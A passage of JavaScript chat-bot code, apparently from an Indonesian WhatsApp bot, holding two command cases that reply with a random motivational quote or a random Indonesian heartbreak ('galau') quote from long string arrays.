"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
//=========================================\\======
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
